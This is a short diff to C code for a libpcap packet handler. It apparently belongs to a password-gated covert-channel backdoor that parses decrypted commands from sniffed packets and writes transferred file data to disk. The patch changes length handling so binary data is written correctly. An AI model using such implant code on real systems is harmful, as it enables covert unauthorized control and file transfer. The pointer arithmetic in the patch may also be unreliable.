@@ -133,6 +133,8 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	int size_tcp;
 	int size_payload;
 	int mode;
+
+	int datalen;
 	//printf("Packet received\n");
 	char password[strlen(PASSWORD) + 1];
 	char * decrypted;
@@ -175,8 +177,8 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "scanning error\n");
 		return;
 	}
-
-	command = parse_cmd(decrypted);
+	command = malloc((PKT_SIZE + 1) * sizeof(char));
+	datalen = parse_cmd(command, decrypted);
 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
@@ -229,10 +231,11 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 			data = strstr(tempCommand, fileName) ;
 			data += strlen(fileName); 
+			datalen = datalen - (data-command);
 			//open file and append payload data to file
 			fp = fopen(fileName, "a+b");
 			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
-			fwrite(data, sizeof(char), strlen(data), fp);
+			fwrite(data, sizeof(char), datalen, fp);
 			fclose(fp);
 			
 		} else if(packetMode == RESPONSE_MODE){// is command output
@@ -268,10 +271,11 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 -- 
 -- NOTES: extracts data between delimiters 
 ----------------------------------------------------------------------------------------------------------------------*/
-char * parse_cmd(char * data)
+int parse_cmd(char * command, char * data)
 {
 	char * start, * end;
-	char * command = malloc((PKT_SIZE + 1) * sizeof(char));
+	/*char * */
+	
 
 	/* Point to the first occurance of pre-defined command string */
 	start = strstr(data, CMD_START);
@@ -286,7 +290,7 @@ char * parse_cmd(char * data)
 	memset(command, 0, PKT_SIZE);
 	strncpy(command, start, (end - start));
 
-	return command;
+	return end-start;
 }
 /*--------------------------------------------------------------------------------------------------------------------
 -- FUNCTION: process_command
